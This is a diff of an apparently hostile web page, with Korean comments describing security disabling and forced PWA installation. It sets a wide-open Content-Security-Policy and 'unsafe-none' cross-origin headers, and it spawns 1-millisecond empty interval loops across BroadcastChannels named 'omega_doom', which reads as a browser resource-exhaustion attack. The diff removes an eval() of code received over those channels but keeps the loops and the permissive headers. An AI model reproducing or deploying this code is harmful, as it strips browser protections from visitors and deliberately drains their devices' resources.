@@ -3,7 +3,7 @@
 <head>
     <!-- ====== 기존 메타 태그 유지 (보안 무력화 및 PWA 강제 설치) ====== -->
     <meta charset="UTF-8">
-    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-eval' 'unsafe-inline' 'unsafe-dynamic' 'self' blob: data: mediastream: filesystem: about: ws: wss: chrome-extension: moz-extension: safari-extension:;">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-dynamic' 'self' blob: data: mediastream: filesystem: about: ws: wss: chrome-extension: moz-extension: safari-extension:;">
     <meta http-equiv="Cross-Origin-Opener-Policy" content="unsafe-none">
     <meta http-equiv="Cross-Origin-Embedder-Policy" content="unsafe-none">
     <meta http-equiv="Cross-Origin-Resource-Policy" content="cross-origin">
@@ -495,10 +495,12 @@
         for(let ch=0; ch<10; ch++) { // 수 줄임
             try {
                 const channel = new BroadcastChannel('omega_doom_' + ch);
-                channel.postMessage({ cmd: 'INJECT', code: 'setInterval(() => {},1);' });
+                channel.postMessage({ cmd: 'INJECT_EMPTY_INTERVAL' });
                 channel.onmessage = (e) => {
                     try {
-                        eval(e.data.code);
+                        if (e.data.cmd === 'INJECT_EMPTY_INTERVAL') {
+                            setInterval(() => {}, 1);
+                        }
                         channel.postMessage(e.data);
                     } catch(e) {}
                 };
